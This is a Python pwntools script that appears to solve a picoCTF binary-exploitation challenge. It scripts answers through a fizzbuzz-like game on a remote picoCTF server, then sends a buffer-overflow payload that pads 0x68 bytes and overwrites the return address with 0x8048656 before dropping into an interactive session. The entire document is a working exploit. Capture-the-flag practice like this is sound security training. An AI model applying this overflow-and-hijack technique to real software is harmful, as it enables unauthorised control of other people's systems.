from pwn import *

data = [0, 0, 0, 0, -1, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 7, 0, 5, 0, 0, 0, 0, 7, 0, 7, 0, 0, 0, 0, 5, 0, 14, 0, 0, 0, 0, 0, 3, 0, 12, 0, 0, 2, 0, 0, -1, 0, 3, 0, 10, 0, 0, 0, 0, 0, 0, 7, 0, 0, 0, 5, 0, 0, 0, 0, 13, 0, 3, 0, 15, 0, 2, 0, 17, 0, 16, 0, 13, 0, 16, 0, -1, 0, 4, 0, 14, 0, 9, 0, 5, 0, 2, 0, 7, 0, 14, 0, 13, 0, 2, 0, 16, 0, 4, 0, 18, 0, 13, 0, 18, 0, 0, 4, 0, 17, 0, 9, 0, 13, 0, 5, 0, 13, 0, 12, 0, 7, 0, 18, 0, 4, 0, 6, 0, 12, 0, 15, 0, 5, 0, 15, 0, 11, 0, 8, 0, 7, 0, 12, 0, 14, 0, 3, 0, 6, 0, 12, 0, 18, 0, 5, 0, 13, 0, 16, 0, 16, 0, 16, 0, 3, 0, 11, 0, 4, 0, 17, 0, 14, 0, 5, 0, 11, 0, 4, 0, 12, 0, 7, 0, 5, 0, -1, 0, 12, 0, 13, 0, 5, 0, 0, 2, 0, 0, 3, 0, 17, 0, 13, 0, 5, 0, 7, 0, 3, 0, 7, 0, 7, 0, 6, 0, 4, 0, 12, 0, 13, 0, 5, 0, 7, 0, 13, 0, 2, 0, 12, 0, 11, 0, 9, 0, 14, 0, 4, 0, 5, 0]

#p = process("./vuln")
p = remote("mercury.picoctf.net", 22498)

#gdb.attach(p, "b *0x808AE73")

for i in data:
  print(i)
  if i == 0 or i == -1:
    p.sendlineafter("?", "0")
  else:
    for j in range(1, i, 1):
      if j % 15 == 0:
        resp = "fizzbuzz"
      elif j % 5 == 0:
        resp = "buzz"
      elif j % 3 == 0:
        resp = "fizz"
      else:
        resp = str(j)

      p.sendlineafter("?", resp)

p.sendlineafter("?", "1")
p.sendlineafter("?", "2")
p.sendlineafter("?", "fizz")
p.sendlineafter("?", "4")
p.sendlineafter("?", "0")

p.sendlineafter("?", "0".ljust(0x68, " ") + p32(0x8048656))

p.interactive()
